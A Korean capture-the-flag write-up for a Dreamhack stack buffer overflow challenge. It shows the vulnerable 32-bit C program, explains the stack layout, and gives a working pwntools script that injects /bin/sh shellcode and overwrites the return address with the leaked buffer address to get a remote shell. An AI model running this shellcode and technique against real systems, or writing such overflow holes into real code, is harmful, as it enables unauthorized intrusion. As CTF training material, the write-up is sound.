```c
// Name: basic_exploitation_000.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

`basic_exploitation_000.c` 코드를 읽어보면, 프로그램을 실행시키면 `buf`의 주소를 얻을 수 있음을 알 수 있다.
따라서 `buf`에 쉘코드를 저장한 후 Return Address를 `buf`의 주소로 수정한다면 쉘을 얻을 수 있으리라는 것을 알 수 있다.
또한, `buf`의 크기는 `0x80`바이트임에도 `scanf("%141s", buf);`를 통해 총 `0x8d`바이트의 문자열을 `buf`에 입력받고 있다.

`basic_exploitation_000.c`의 `main` 함수에서 선언된 변수가 `0x80`바이트의 배열 `buf` 뿐이며, 스택은 `0x10`바이트 단위로 정렬되어야 하므로 `0x80`바이트가 할당되며, 그 뒤 `0x4`바이트가 SFP, 그 뒤 `0x4`바이트가 Return Address이다.
(SFP, Return Address가 `0x4`바이트인 것은 주어진 환경이 32비트 환경이기 때문이다.)
즉, 필요한 문자열의 길이는 `0x88`바이트로, 프로그램이 `stdin`을 통해 입력받는 `0x8d`바이트보다 작으므로 아래의 `pwntools`을 사용한 python 코드를 활용하여 쉘을 탈취할 수 있다.

```python
# Name: exploit.py

from pwn import *
import re
# context.log_level = "debug"
context.arch = "i386"
context.os = "linux"

HOST = "host3.dreamhack.games"
PORT = 23760 # The given port

conn = remote(HOST, PORT)
# conn = process("./basic_exploitation_000")

shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
payload = shellcode
payload += asm('nop') * (0x84 - len(payload))

conn.recvuntil('buf = (')
addr = int(conn.recv(10), base=16)
payload += p32(addr)

conn.sendline(payload)
conn.interactive()
```

위 코드에서 `b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'`는 `scanf`의 종결문자를 포함하지 않는 쉘코드이며, 구글링을 통해 쉽게 얻을 수 있다.
이제 위와 같이 python 코드를 작성했으면, 아래의 명령어를 통해 쉘을 탈취할 수 있으며, flag를 쉽게 얻을 수 있다.

```bash
$ python3 exploit.py
```